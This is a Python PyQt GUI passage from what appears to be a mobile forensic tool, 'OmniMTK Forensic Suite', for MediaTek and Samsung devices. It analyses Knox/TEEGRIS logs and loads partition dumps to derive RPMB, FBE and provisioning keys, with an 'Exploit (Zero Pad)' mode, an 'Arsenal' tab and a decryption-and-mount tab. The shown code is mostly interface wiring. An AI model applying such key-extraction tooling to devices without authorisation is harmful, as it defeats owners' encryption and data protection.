            hdr = QLabel("  Samsung Knox / TEEGRIS + Binary Analyzer — v9.7 · Weaponized Execution")
            hdr.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
            hdr.setStyleSheet("color:#60d0ff;padding:4px;background:#0d1a24;border-radius:4px;")
            root_layout.addWidget(hdr)

            # Sub-tab widget
            self._sub_tabs = QTabWidget()
            self._sub_tabs.setStyleSheet(
                "QTabBar::tab{background:#1a1a2a;color:#a0a0b0;padding:6px 16px;"
                "border:1px solid #3a3a5a;border-bottom:none;border-radius:4px 4px 0 0;}"
                "QTabBar::tab:selected{background:#252540;color:#80c8ff;font-weight:bold;}"
                "QTabWidget::pane{border:1px solid #3a3a5a;}"
            )

            # ── Tab 1: Knox / Log Analysis ────────────────────────────────
            tab1 = QWidget()
            layout = QVBoxLayout(tab1)
            layout.setContentsMargins(6, 6, 6, 6)
            layout.setSpacing(8)

            self.analyze_btn = QPushButton("▶  Analyze Samsung Log (paste log first in main tab)")
            self.analyze_btn.setMinimumHeight(36)
            self.analyze_btn.setStyleSheet(
                "background:#1a2a3a;border:1px solid #2a5a8a;color:#80c8ff;"
                "font-weight:bold;font-size:12px;border-radius:4px;"
            )
            layout.addWidget(self.analyze_btn)

            splitter = QSplitter(Qt.Orientation.Horizontal)

            left = QWidget()
            ll = QVBoxLayout(left)
            ll.setContentsMargins(0, 0, 0, 0)

            knox_grp = QGroupBox("Knox / TEEGRIS Detection")
            kg = QGridLayout(knox_grp)
            self._knox_labels = {}
            rows = [
                ("Model", "model"), ("Brand", "brand"), ("Firmware", "firmware_version"),
                ("TEE Type", "tee_type"), ("Knox Version", "knox_version"),
                ("RPMB Path", "rpmb_path"), ("SBC Active", "sbc_active"),
                ("DAA Active", "daa_active"), ("Userdata FS", "userdata_fs"),
                ("FBE Active", "fbe_active"), ("Bypass Status", "bypass_status"),
                ("Feasibility", "key_derivation_feasibility"),
            ]
            for i, (label, key) in enumerate(rows):
                lbl = QLabel(label + ":")
                lbl.setStyleSheet("color:#808090;font-size:11px;")
                val = QLabel("—")
                val.setStyleSheet("color:#d0d0e0;font-size:11px;font-weight:bold;")
                val.setWordWrap(True)
                kg.addWidget(lbl, i, 0)
                kg.addWidget(val, i, 1)
                self._knox_labels[key] = val
            kg.setRowStretch(len(rows), 1)
            ll.addWidget(knox_grp)

            socid_grp = QGroupBox("SOC_ID Analysis")
            sg = QVBoxLayout(socid_grp)
            self.socid_text = QTextEdit()
            self.socid_text.setReadOnly(True)
            self.socid_text.setFont(QFont("Consolas", 10))
            self.socid_text.setMaximumHeight(200)
            self.socid_text.setStyleSheet("background:#0d0d14;color:#80e0c0;border:1px solid #2a3a2a;")
            sg.addWidget(self.socid_text)
            ll.addWidget(socid_grp)

            splitter.addWidget(left)

            right = QWidget()
            rl = QVBoxLayout(right)
            rl.setContentsMargins(0, 0, 0, 0)

            fbe_grp = QGroupBox("F2FS / FBE Structure")
            fg = QVBoxLayout(fbe_grp)
            self.fbe_text = QTextEdit()
            self.fbe_text.setReadOnly(True)
            self.fbe_text.setFont(QFont("Consolas", 10))
            self.fbe_text.setStyleSheet("background:#0d0d14;color:#c0e080;border:1px solid #2a3a2a;")
            fg.addWidget(self.fbe_text)
            rl.addWidget(fbe_grp)

            part_grp = QGroupBox("Samsung Partition Priority Map")
            pg = QVBoxLayout(part_grp)
            self.part_tree = QTreeWidget()
            self.part_tree.setHeaderLabels(["Partition", "Encrypted", "Priority", "Description"])
            self.part_tree.setColumnWidth(0, 100)
            self.part_tree.setColumnWidth(1, 80)
            self.part_tree.setColumnWidth(2, 70)
            self.part_tree.setColumnWidth(3, 300)
            self.part_tree.setStyleSheet("background:#1c1c24;color:#d0d0e0;font-size:10px;")
            self._populate_partition_map()
            pg.addWidget(self.part_tree)
            rl.addWidget(part_grp)

            splitter.addWidget(right)
            splitter.setSizes([400, 600])
            layout.addWidget(splitter, stretch=1)

            self.recs_text = QTextEdit()
            self.recs_text.setReadOnly(True)
            self.recs_text.setMaximumHeight(100)
            self.recs_text.setFont(QFont("Consolas", 10))
            self.recs_text.setPlaceholderText("Recommendations and warnings will appear here after analysis...")
            self.recs_text.setStyleSheet("background:#14140a;color:#e0c040;border:1px solid #4a4a2a;")
            layout.addWidget(self.recs_text)

            self._sub_tabs.addTab(tab1, "Knox / Log Analysis")

            # ── Tab 2: Binary Sector Analysis ─────────────────────────────
            self._binary_tab = BinarySectorAnalysisTab(
                self._loaded_partitions, forensic_journal=self._forensic_journal,
                hcm=self._hcm
            )
            self._sub_tabs.addTab(self._binary_tab, "⬡  Binary Sector Analysis")

            root_layout.addWidget(self._sub_tabs, stretch=1)

        def _populate_partition_map(self):
            pm = SamsungPartitionAnalyzer.get_partition_map_report()
            priority_colors = {"HIGH":"#ff8060","MEDIUM":"#e0c060","LOW":"#808090"}
            for p in pm:
                item = QTreeWidgetItem([p["partition"],p["encrypted"],p["forensic_priority"],p["description"]])
                color = priority_colors.get(p["forensic_priority"],"#d0d0e0")
                for col in range(4):
                    item.setForeground(col, QColor(color))
                self.part_tree.addTopLevelItem(item)

        def update_analysis(self, log_text: str):
            knox = KnoxAnalyzer.analyze(log_text)
            for key, lbl in self._knox_labels.items():
                val = knox.get(key, "—")
                color = "#d0d0e0"
                if key == "tee_type":
                    color = "#60d0ff" if val == "TEEGRIS" else ("#e0a060" if val == "KINIBI" else "#d0d0e0")
                elif key == "rpmb_path":
                    color = "#ff8060" if val == "SAMSUNG_KNOX" else "#80e080"
                elif key == "key_derivation_feasibility":
                    color = "#e0a060"
                elif str(val) in ("True","False"):
                    color = "#ff8060" if val else "#60e060"
                lbl.setText(str(val))
                lbl.setStyleSheet(f"color:{color};font-size:11px;font-weight:bold;")

            soc_id = knox.get("soc_id_raw")
            if not soc_id:
                m = re.search(r'(?:Get\s+SOC\s+ID|SOC\s+ID)\s*[:\.\[]+\s*([0-9A-Fa-f]{64})', log_text, re.I)
                if m:
                    soc_id = m.group(1).upper()

            if soc_id:
                sa = SamsungSOCIDAnalyzer.analyze(soc_id)
                lines = [
                    f"SOC_ID    : {soc_id}",
                    f"Entropy   : {sa['shannon_entropy_bits']} bits  [{sa['entropy_quality']}]",
                    f"Chip Fam  : {sa['chip_family_block']}",
                    f"HW Rev    : {sa['hw_revision_human']}",
                    f"Silicon FP: {sa['silicon_fingerprint']}",
                    f"Sec Flags : {sa['security_flags_inferred']}",
                    f"Dev FP    : {sa['derived_device_fingerprint']}",
                    f"SHA256    : {sa['sha256_of_socid'][:32]}...",
                ]
                self.socid_text.setPlainText("\n".join(lines))
            else:
                self.socid_text.setPlainText("SOC_ID (64-char) not found in log.")

            fbe = F2FSFBEAnalyzer.analyze(log_text)
            fbe_lines = [
                f"FS Type      : {fbe['fs_type']}",
                f"FBE Version  : {fbe['fbe_version']}",
                f"Storage      : {fbe['total_storage_human']}",
                f"UFS FW Ver   : {fbe['ufs_fw_ver']}",
                f"EOL Status   : {fbe['eol_info']}  [{fbe['storage_health']}]",
                f"Lifetime A   : {fbe['lifetime_a']}",
                f"Lifetime B   : {fbe['lifetime_b']}",
                f"EXT RAM      : {fbe['ext_ram']}",
                "",
                "UFS Logical Units:",
            ]
            for lu, info in fbe["ufs_lus"].items():
                fbe_lines.append(f"  {lu}: {info['size_human']}  ({info['size_hex']})")
            if fbe["fbe_key_hierarchy"]:
                fbe_lines.append("\nFBE Key Hierarchy:")
                fbe_lines.extend(f"  {s}" for s in fbe["fbe_key_hierarchy"])
            fbe_lines.append("\nFBE Key Chain Security Assessment:")
            for k, v in fbe["fbe_key_chain_analysis"].items():
                fbe_lines.append(f"  {k:22s}: {v}")
            self.fbe_text.setPlainText("\n".join(fbe_lines))

            recs = knox.get("recommendations", [])
            warns = knox.get("warnings", [])
            all_msg = []
            if warns:
                all_msg.append("WARNINGS:")
                all_msg.extend(f"  ⚠  {w}" for w in warns)
            if recs:
                all_msg.append("RECOMMENDATIONS:")
                all_msg.extend(f"  →  {r}" for r in recs)
            self.recs_text.setPlainText("\n".join(all_msg) if all_msg else "No warnings.")

    class DerivationWorker(QThread):
        finished = pyqtSignal(dict, str, list, list)
        error    = pyqtSignal(str)

        def __init__(self, log_text, legacy, pad_mode, manual_meid, manual_chip, loaded_partitions=None):
            super().__init__()
            self.log_text    = log_text
            self.legacy      = legacy
            self.pad_mode    = pad_mode
            self.manual_meid = manual_meid
            self.manual_chip = manual_chip
            self.loaded_partitions = loaded_partitions or {}

        def run(self):
            try:
                res, warns, dbg = generate_keys_json(
                    self.log_text, self.legacy, self.pad_mode,
                    self.manual_meid, self.manual_chip, self.loaded_partitions
                )
                display_dict = {k: v for k, v in res.items() if not k.startswith("_")}
                self.finished.emit(res, json.dumps(display_dict, indent=2, ensure_ascii=False), warns, dbg)
            except Exception as e:
                self.error.emit(str(e))

    class DarkPalette:
        @staticmethod
        def apply(app: QApplication):
            dp = QPalette()
            dp.setColor(QPalette.ColorRole.Window,          QColor(18, 18, 24))
            dp.setColor(QPalette.ColorRole.WindowText,      QColor(220, 220, 230))
            dp.setColor(QPalette.ColorRole.Base,            QColor(28, 28, 36))
            dp.setColor(QPalette.ColorRole.AlternateBase,   QColor(35, 35, 45))
            dp.setColor(QPalette.ColorRole.Text,            QColor(220, 220, 230))
            dp.setColor(QPalette.ColorRole.Button,          QColor(45, 45, 58))
            dp.setColor(QPalette.ColorRole.ButtonText,      QColor(220, 220, 230))
            dp.setColor(QPalette.ColorRole.Highlight,       QColor(40, 100, 160))
            dp.setColor(QPalette.ColorRole.HighlightedText, QColor(255, 255, 255))
            app.setPalette(dp)
            app.setStyleSheet("""
                QMainWindow,QDialog{background-color:#121218;}
                QGroupBox{border:1px solid #3a3a4a;border-radius:6px;margin-top:10px;
                          padding-top:10px;font-weight:bold;color:#c8c8e6;}
                QGroupBox::title{subcontrol-origin:margin;left:10px;padding:0 5px;}
                QTextEdit{background:#1c1c24;color:#d0d0e0;border:1px solid #3a3a4a;
                          border-radius:4px;font-family:'Consolas','Courier New',monospace;
                          font-size:12px;padding:8px;}
                QLineEdit{background:#1c1c24;color:#d0d0e0;border:1px solid #3a3a4a;
                          border-radius:4px;font-family:'Consolas','Courier New',monospace;
                          font-size:13px;padding:6px;}
                QLineEdit:focus{border:1px solid #2a6aaa;}
                QPushButton{background:#1a3a5a;color:#f0f0f0;border:1px solid #2a6aaa;
                            border-radius:4px;padding:8px 20px;font-weight:bold;font-size:12px;}
                QPushButton:hover{background:#2a4a7a;border:1px solid #3a8aee;}
                QPushButton:pressed{background:#0a1a3a;}
                QPushButton:disabled{background:#1a2a3a;color:#505060;border:1px solid #2a3a4a;}
                QPushButton#secondaryBtn{background:#2a2a3a;border:1px solid #4a4a5a;}
                QPushButton#secondaryBtn:hover{background:#3a3a4a;}
                QPushButton#debugBtn{background:#1a2a3a;border:1px solid #2a4a6a;color:#80b0e0;}
                QPushButton#exportBtn{background:#1a3a1a;border:1px solid #2a6a2a;color:#80e080;}
                QPushButton#loadBtn{background:#1a1a3a;border:1px solid #3a3a7a;color:#a0a0e8;
                                    padding:5px 12px;font-size:11px;}
                QLabel{color:#b0b0c8;font-size:12px;}
                QStatusBar{background:#1a1a22;color:#8888a0;border-top:1px solid #2a2a3a;}
                QCheckBox{color:#b0b0c8;font-size:11px;}
                QComboBox{background:#1c1c24;color:#d0d0e0;border:1px solid #3a3a4a;
                          border-radius:4px;padding:4px 8px;}
                QTabWidget::pane{border:1px solid #3a3a4a;background:#121218;}
                QTabBar::tab{background:#1c1c24;color:#808090;padding:7px 16px;
                             border:1px solid #2a2a3a;margin-right:2px;border-radius:3px 3px 0 0;}
                QTabBar::tab:selected{background:#2a2a3a;color:#d0d0e0;border-bottom:2px solid #2a6aaa;}
                QTreeWidget{background:#1c1c24;color:#d0d0e0;border:1px solid #3a3a4a;font-size:10px;}
                QTreeWidget::item:selected{background:#1a3a5a;}
                QProgressBar{background:#1c1c24;border:1px solid #3a3a4a;border-radius:4px;
                             text-align:center;color:#d0d0e0;}
                QProgressBar::chunk{background:#2a6aaa;border-radius:3px;}
            """)

    class MTKKeyToolWindow(QMainWindow):
        def __init__(self):
            super().__init__()
            self.setWindowTitle(
                "OmniMTK Forensic Suite v13.0 — SAMSUNG EDITION  "
                "| Chain of Custody · Determinism · Evidence Integrity · State Machine · 300+ Chips"
            )
            self.setMinimumSize(1500, 950)
            self._worker      = None
            self._last_result = None
            self._debug_lines: list = []
            self._loaded_partitions: dict = {}
            self._partition_handles: dict = {}
            # v12.0: Forensic determinism infrastructure
            self._forensic_journal = ForensicJournal()
            self._forensic_journal.vault_write_failed.connect(self._on_vault_write_failed)
            # v12.4: Async full-file hashing worker with cancellation
            self._hash_worker = None
            self._hcm = HardwareCapabilityMatrix()
            self._forensic_state = ForensicState.DETECTED
            self._build_ui()

        def _build_ui(self):
            cw = QWidget()
            self.setCentralWidget(cw)
            root = QVBoxLayout(cw)
            root.setContentsMargins(14,14,14,10)
            root.setSpacing(10)

            tbar = QHBoxLayout()
            title = QLabel("OmniMTK Forensic Suite  v13.0 — SAMSUNG EDITION")
            title.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
            title.setStyleSheet("color:#40a0e0;")
            tbar.addWidget(title)
            tbar.addStretch()
            sub = QLabel("Samsung Knox/TEEGRIS · SOC_ID Analyzer · F2FS FBE · Partition Map · 300+ Chips")
            sub.setStyleSheet("color:#606070;font-size:10px;")
            tbar.addWidget(sub)
            root.addLayout(tbar)

            main_sp = QSplitter(Qt.Orientation.Horizontal)

            left_widget = QWidget()
            left_layout = QVBoxLayout(left_widget)
            left_layout.setContentsMargins(0,0,0,0)
            left_layout.setSpacing(8)

            self.tabs = QTabWidget()

            # ── Log Input Tab ──────────────────────────────────────────────
            log_tab = QWidget()
            lt = QVBoxLayout(log_tab)
            lt.setContentsMargins(6,6,6,6)
            lt.setSpacing(6)

            file_bar = QFrame()
            file_bar.setStyleSheet("background:#1a1a2a;border-radius:5px;border:1px solid #2a2a3a;")
            fb_layout = QHBoxLayout(file_bar)
            fb_layout.setContentsMargins(8,6,8,6)
            fb_layout.setSpacing(8)

            for btn_label, btn_type in [
                ("📁 BROM dump","brom"),("📁 proinfo","proinfo"),
                ("📁 devinfo","devinfo"),("📁 seccfg","seccfg"),
                ("📁 sec","sec"),("📁 metadata","metadata"),
            ]:
                btn = QPushButton(btn_label)
                btn.setObjectName("loadBtn")
                btn.clicked.connect(lambda _, t=btn_type: self._on_load_file(t))
                fb_layout.addWidget(btn)

            fb_layout.addStretch()
            self.loaded_files_lbl = QLabel("No partition files loaded")
            self.loaded_files_lbl.setStyleSheet("color:#505068;font-size:10px;font-style:italic;")
            fb_layout.addWidget(self.loaded_files_lbl)
            clr = QPushButton("✕")
            clr.setObjectName("secondaryBtn")
            clr.setFixedSize(24,24)
            clr.clicked.connect(self._on_clear_files)
            fb_layout.addWidget(clr)
            lt.addWidget(file_bar)

            lg = QGroupBox("Paste Log  (BROM · UART · Pandora · UFI · EasyJTAG · CM2 · Miracle · NCK · Hydra · MRT · DFT · Chimera)")
            ll = QVBoxLayout(lg)
            self.input_text = QTextEdit()
            self.input_text.setPlaceholderText(
                "Paste your MTK/Samsung device log here...\n\n"
                "For Samsung devices (like SM-A346E), paste the full Pandora Box log.\n"
                "The Samsung Analysis tab will auto-detect Knox version, TEE type,\n"
                "F2FS FBE info, SOC_ID breakdown, and partition priorities.\n\n"
                "Binary partition files:\n"
                "  • BROM dump → kmkey (MTK non-Samsung only)\n"
                "  • proinfo   → MiRPMBKey seed\n"
                "  • devinfo   → PROVKEY\n"
                "  • sec       → Knox warranty bit, lock state\n"
                "  • metadata  → FBE vold metadata"
            )
            ll.addWidget(self.input_text)
            lt.addWidget(lg)
            self.tabs.addTab(log_tab, "  Log Input  ")

            # ── Manual Input Tab ───────────────────────────────────────────
            man_tab = QWidget()
            ml = QVBoxLayout(man_tab)
            ml.setContentsMargins(6,6,6,6)
            mg = QGroupBox("Manual ME_ID / HW_UID Entry")
            mgl = QVBoxLayout(mg)
            mgl.addWidget(QLabel("ME_ID or HW_UID (32 hex chars, or 4×0xXXXXXXXX words):"))
            self.manual_meid_input = QLineEdit()
            self.manual_meid_input.setPlaceholderText("686D3BA6F9345B152DA1326BF5A5B7A4")
            self.manual_meid_input.setMinimumHeight(38)
            mgl.addWidget(self.manual_meid_input)
            mgl.addSpacing(10)
            mgl.addWidget(QLabel("Chip ID (optional):"))
            self.manual_chip_input = QLineEdit()
            self.manual_chip_input.setPlaceholderText("MT6877   or   Dimensity 900")
            self.manual_chip_input.setMinimumHeight(38)
            mgl.addWidget(self.manual_chip_input)
            mgl.addStretch()
            ml.addWidget(mg)
            self.tabs.addTab(man_tab, "  Manual Input  ")

            # ── Samsung Analysis Tab (FEATURES 1-5) ───────────────────────
            self.samsung_tab = SamsungAnalysisTab(
                self._loaded_partitions, forensic_journal=self._forensic_journal,
                hcm=self._hcm
            )
            self.samsung_tab.analyze_btn.clicked.connect(self._on_samsung_analyze)
            self.tabs.addTab(self.samsung_tab, "  Samsung Analysis  ")

            # ── Arsenal Tab (v12.4 — Synthesis & Emulation) ─────────────
            self.arsenal_tab = ArsenalTab(hcm=self._hcm)
            self.tabs.addTab(self.arsenal_tab, "  ☣️ Arsenal  ")

            # ── Decryption & Mount Tab (v11.3 — Forensic Fortification) ─────────
            self.decrypt_tab = DecryptionTab(
                result_getter=lambda: getattr(self, "_last_result", None),
                on_ready=self._on_decrypt_ready,
                forensic_journal=self._forensic_journal,
                hcm=self._hcm
            )
            self.tabs.addTab(self.decrypt_tab, "  🔓 Decryption & Mount  ")

            # ── Forensic Journal Tab (v12.0 — Evidence Traceability) ─────────
            journal_tab = QWidget()
            jt = QVBoxLayout(journal_tab)
            jt.setContentsMargins(6, 6, 6, 6)
            self.journal_text = QTextEdit()
            self.journal_text.setReadOnly(True)
            self.journal_text.setFont(QFont("Consolas", 10))
            self.journal_text.setStyleSheet(
                "background:#0a0a12;color:#c8d0e0;border:1px solid #2a2a4a;"
            )
            self.journal_text.setPlaceholderText(
                "Forensic Journal v13.0\n"
                "Every file load, key derivation, and command generation is logged here "
                "with SHA-256 hash and UTC timestamp for court-acceptable traceability."
            )
            jt.addWidget(self.journal_text, stretch=1)
            # v12.1: Export button — immutable journal to timestamped file
            self.export_journal_btn = QPushButton("📤 Export Forensic Log")
            self.export_journal_btn.setStyleSheet(
                "background:#1a1a3a;color:#a0a0ff;border:1px solid #3a3a6a;padding:6px;"
            )
            self.export_journal_btn.clicked.connect(self._on_export_journal)
            jt.addWidget(self.export_journal_btn)
            self.tabs.addTab(journal_tab, "  📋 Forensic Journal  ")

            left_layout.addWidget(self.tabs, stretch=0)

            rg = QGroupBox("Derived Keys (JSON)")
            rl = QVBoxLayout(rg)
            self.output_text = QTextEdit()
            self.output_text.setReadOnly(True)
            self.output_text.setPlaceholderText(
                "Derived keys appear here.\n"
                "Keys showing 00000000… require partition files.\n"
                "For Samsung devices, RPMB/FBE keys are Knox-protected."
            )
            JsonHighlighter(self.output_text.document())
            rl.addWidget(self.output_text)
            left_layout.addWidget(rg, stretch=1)

            main_sp.addWidget(left_widget)

            right_widget = QWidget()
            right_layout = QVBoxLayout(right_widget)
            right_layout.setContentsMargins(0,0,0,0)
            right_layout.setSpacing(8)

            chip_grp = QGroupBox("Chip Info")
            chip_grp.setFixedWidth(230)
            cg = QGridLayout(chip_grp)
            cg.setSpacing(6)
            self._chip_labels = {}
            fields = [("Chip ID","_chip_id"),("Name","_chip_name"),
                      ("Year","_chip_year"),("Process","_chip_process"),("Category","_chip_cat")]
            for row,(label,key) in enumerate(fields):
                lbl = QLabel(label+":"); lbl.setStyleSheet("color:#808090;font-size:11px;")
                val = QLabel("—"); val.setStyleSheet("color:#d0d0e0;font-size:11px;font-weight:bold;")
                val.setWordWrap(True)
                cg.addWidget(lbl,row,0); cg.addWidget(val,row,1)
                self._chip_labels[key] = val
            cg.setRowStretch(len(fields),1)
            right_layout.addWidget(chip_grp)

            hist_grp = QGroupBox("Session History")
            hg = QVBoxLayout(hist_grp)
            self._hist_tree = QTreeWidget()
            self._hist_tree.setHeaderLabels(["Time","Chip","ME_ID"])
            self._hist_tree.setColumnWidth(0,80)
            self._hist_tree.setColumnWidth(1,80)
            self._hist_tree.setStyleSheet("background:#1c1c24;color:#d0d0e0;font-size:10px;")
            hg.addWidget(self._hist_tree)
            right_layout.addWidget(hist_grp, stretch=1)

            main_sp.addWidget(right_widget)
            main_sp.setSizes([1250, 240])
            root.addWidget(main_sp, stretch=1)

            cf = QFrame()
            cf.setStyleSheet("background:#1a1a22;border-radius:6px;")
            cl = QHBoxLayout(cf)
            cl.setContentsMargins(14,10,14,10)
            cl.setSpacing(10)

            self.derive_btn = QPushButton("▶  Derive Keys")
            self.derive_btn.setMinimumSize(150,40)
            self.derive_btn.clicked.connect(self._on_derive)
            cl.addWidget(self.derive_btn)

            self.clear_btn = QPushButton("Clear")
            self.clear_btn.setObjectName("secondaryBtn")
            self.clear_btn.setMinimumSize(90,40)
            self.clear_btn.clicked.connect(self._on_clear)
            cl.addWidget(self.clear_btn)

            self.export_combo = QComboBox()
            self.export_combo.addItems(["JSON","TXT (Plain)","CSV"])
            self.export_combo.setMinimumWidth(130)
            cl.addWidget(self.export_combo)

            self.save_btn = QPushButton("Save")
            self.save_btn.setObjectName("exportBtn")
            self.save_btn.setMinimumSize(80,40)
            self.save_btn.clicked.connect(self._on_save)
            self.save_btn.setEnabled(False)
            cl.addWidget(self.save_btn)

            self.debug_btn = QPushButton("Parse Debug")
            self.debug_btn.setObjectName("debugBtn")
            self.debug_btn.setMinimumSize(110,40)
            self.debug_btn.clicked.connect(self._on_debug)
            cl.addWidget(self.debug_btn)

            cl.addSpacing(4)
            self.legacy_cb = QCheckBox("Legacy (No Endian Swap)")
            cl.addWidget(self.legacy_cb)

            self.mode_combo = QComboBox()
            self.mode_combo.addItems(["Standard (PKCS7)","Exploit (Zero Pad)"])
            cl.addWidget(self.mode_combo)

            cl.addStretch()

            self.progress = QProgressBar()
            self.progress.setRange(0,0)
            self.progress.setFixedSize(120,20)
            self.progress.setVisible(False)
            cl.addWidget(self.progress)

            # v12.4: Cancel button for long hashing operations
            self.cancel_hash_btn = QPushButton("🛑 Cancel")
            self.cancel_hash_btn.setStyleSheet(
                "background:#3a0a0a;color:#ff4040;border:1px solid #ff4040;padding:4px;font-size:10px;"
            )
            self.cancel_hash_btn.setVisible(False)
            self.cancel_hash_btn.clicked.connect(self._on_cancel_hash)
            cl.addWidget(self.cancel_hash_btn)

            self.status_label = QLabel("Ready")
            self.status_label.setStyleSheet("color:#808090;font-size:11px;min-width:200px;")
            cl.addWidget(self.status_label)

            root.addWidget(cf)
            self.sb = QStatusBar()
            self.setStatusBar(self.sb)
            self.sb.showMessage("OmniMTK v13.0 Future-Proof Convergence  ·  Ready")
            # v12.0: Initialize state machine after UI build
            self._update_state_machine()

        def _on_samsung_analyze(self):
            txt = self.input_text.toPlainText().strip()
            if not txt:
                QMessageBox.warning(self, "No Input", "Paste a device log in the 'Log Input' tab first.")
                return
            self.samsung_tab.update_analysis(txt)
            self.tabs.setCurrentWidget(self.samsung_tab)

        def _set_all_buttons_enabled(self, enabled: bool):
            """v12.1: Atomically enable/disable primary action buttons during async I/O."""
            self.derive_btn.setEnabled(enabled)
            self.save_btn.setEnabled(enabled and self._last_result is not None)
            self.clear_btn.setEnabled(enabled)
            self.debug_btn.setEnabled(enabled)

        def _on_load_file(self, file_type: str):
            fp, _ = QFileDialog.getOpenFileName(
                self, f"Load {file_type}", str(Path.home()), "Binary files (*.bin *.dump);;All Files (*)"
            )
            if not fp:
                return
            # v12.2: Block UI, show cancel button, start async full-file hash
            self._set_all_buttons_enabled(False)
            self.cancel_hash_btn.setVisible(True)
            self.cancel_hash_btn.setEnabled(True)
            self.progress.setRange(0, 100)
            self.progress.setValue(0)
            self.progress.setVisible(True)
            self.status_label.setText("Hashing evidence file…")
            self._hash_worker = HashWorker(fp)
            self._hash_worker.progress.connect(self.progress.setValue)
            self._hash_worker.finished.connect(
                lambda sha: self._on_load_file_hash_finished(fp, file_type, sha)
            )
            self._hash_worker.error.connect(
                lambda msg: self._on_load_file_hash_error(msg)
            )
            self._hash_worker.cancelled.connect(self._on_load_file_hash_cancelled)
            self._hash_worker.start()

        def _on_load_file_hash_finished(self, fp: str, file_type: str, sha: str):
            """v12.1: Callback after full-file SHA-256 completes. Now safe to mmap."""
            try:
                _fh = open(fp, "rb")
                try:
                    raw = mmap.mmap(_fh.fileno(), _get_real_size(_fh.fileno()), access=mmap.ACCESS_READ)
                except ValueError as e:
                    _fh.close()
                    if "empty file" in str(e).lower():
                        QMessageBox.critical(self, "Load Error", f"FILE_EMPTY: {file_type}")
                        return
                    raise
                # v12.1: Log FULL file hash to Forensic Journal only on 100% completion
                self._forensic_journal.record(
                    event_type="FILE_LOAD",
                    file_path=fp,
                    size_bytes=len(raw),
                    notes=f"Partition type: {file_type}  |  SHA-256: {sha}"
                )
                self.journal_text.setPlainText(self._forensic_journal.to_text())
                # Close any previous mmap+fh for this file_type before overwriting
                if file_type in self._loaded_partitions:
                    try:
                        self._loaded_partitions[file_type].close()
                    except Exception as e:
                        print(f"[WARN] mmap.close() failed for {file_type}: {e}", file=sys.stderr)
                if file_type in self._partition_handles:
                    try:
                        self._partition_handles[file_type].close()
                    except Exception as e:
                        print(f"[WARN] fh.close() failed for {file_type}: {e}", file=sys.stderr)
                self._loaded_partitions[file_type] = raw
                self._partition_handles[file_type] = _fh
                # v12.0: State transition on first file load
                if self._forensic_state == ForensicState.DETECTED:
                    self._forensic_state = ForensicState.PROFILED
                synthetic_text, _ = load_binary_file(fp)
                current = self.input_text.toPlainText()
                self.input_text.setPlainText(current + "\n\n" + synthetic_text)
                self.loaded_files_lbl.setText(
                    ", ".join(sorted(self._loaded_partitions.keys())) or "No partition files loaded"
                )
                self.sb.showMessage(f"Loaded {file_type}: {Path(fp).name}  |  SHA-256: {sha[:16]}…")
                self._update_state_machine()
            except Exception as e:
                QMessageBox.critical(self, "Load Error", f"Failed to load {file_type}:\n{e}")
            finally:
                self._set_all_buttons_enabled(True)
                self.cancel_hash_btn.setVisible(False)
                self.progress.setRange(0, 0)
                self.progress.setVisible(False)
                self.status_label.setText("Ready")
                if self._hash_worker is not None:
                    self._hash_worker.deleteLater()
                    self._hash_worker = None

        def _on_cancel_hash(self):
            """v12.2: User clicked Cancel during long hashing operation."""
            if self._hash_worker is not None and self._hash_worker.isRunning():
                self.cancel_hash_btn.setEnabled(False)
                self.status_label.setText("Cancelling hash…")
                self._hash_worker.cancel()

        def _on_load_file_hash_cancelled(self):
            """v12.2: HashWorker safely halted after user cancellation."""
            self._set_all_buttons_enabled(True)
            self.cancel_hash_btn.setVisible(False)
            self.progress.setRange(0, 0)
            self.progress.setVisible(False)
            self.status_label.setText("Hash cancelled")
            self._forensic_journal.record(
                event_type="HASH_CANCELLED",
                file_path="",
                notes="User cancelled forensic hashing before completion"
            )
            self.journal_text.setPlainText(self._forensic_journal.to_text())
            self.sb.showMessage("Hash cancelled by examiner")
            if self._hash_worker is not None:
                self._hash_worker.deleteLater()
                self._hash_worker = None

        def _on_load_file_hash_error(self, msg: str):
            """v12.1: Callback when hashing fails (disk disconnect, I/O error)."""
            QMessageBox.critical(self, "Hash Error", f"Forensic hashing failed:\n{msg}")
            self._set_all_buttons_enabled(True)
            self.cancel_hash_btn.setVisible(False)
            self.progress.setRange(0, 0)
            self.progress.setVisible(False)
            self.status_label.setText("Hash failed")
            if self._hash_worker is not None:
                self._hash_worker.deleteLater()
                self._hash_worker = None

        def _cleanup_partitions(self):
            """v9.8 FIX: Explicitly close mmap objects and file handles before clearing."""
            for ft, mmap_obj in list(self._loaded_partitions.items()):
                try:
                    mmap_obj.close()
                except Exception as e:
                    print(f"[WARN] mmap.close() failed for {ft}: {e}", file=sys.stderr)
            self._loaded_partitions.clear()
            for ft, fh in list(self._partition_handles.items()):
                try:
                    fh.close()
                except Exception as e:
                    print(f"[WARN] fh.close() failed for {ft}: {e}", file=sys.stderr)
            self._partition_handles.clear()

        def _on_clear_files(self):
            self._cleanup_partitions()
            self.loaded_files_lbl.setText("No partition files loaded")
            self.sb.showMessage("Partition files cleared")

        def _on_clear(self):
            self._cleanup_partitions()
            self.input_text.clear()
            self.manual_meid_input.clear()
            self.manual_chip_input.clear()
            self.output_text.clear()
            self._last_result = None
            self._debug_lines.clear()
            self._chip_labels["_chip_id"].setText("—")
            self._chip_labels["_chip_name"].setText("—")
            self._chip_labels["_chip_year"].setText("—")
            self._chip_labels["_chip_process"].setText("—")
            self._chip_labels["_chip_cat"].setText("—")
            self.save_btn.setEnabled(False)
            # v12.0: Reset state machine on clear
            self._forensic_state = ForensicState.DETECTED
            self._hcm = HardwareCapabilityMatrix()
            self.sb.showMessage("Cleared")
            self._update_state_machine()

        def _on_export_journal(self):
            """v12.1 — Export the immutable forensic journal to a timestamped file."""
            ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
            default_name = f"OmniMTK_Journal_{ts}.txt"
            fp, _ = QFileDialog.getSaveFileName(
                self, "Export Forensic Journal", str(Path.home() / default_name),
                "Text files (*.txt)"
            )
            if not fp:
                return
            try:
                text = self._forensic_journal.to_text()
                Path(fp).write_text(text, encoding="utf-8")
                self.sb.showMessage(f"Forensic journal exported: {Path(fp).name}")
            except Exception as e:
                QMessageBox.critical(self, "Export Error", f"Failed to export journal:\n{e}")

        def _on_vault_write_failed(self, msg: str):
            """v12.5 — Zero-Trust: if the audit vault cannot be written, the analyst
            must be explicitly aware. Silent swallow is forensic treason."""
            self.sb.showMessage(f"CRITICAL: VAULT WRITE FAILED — {msg}")
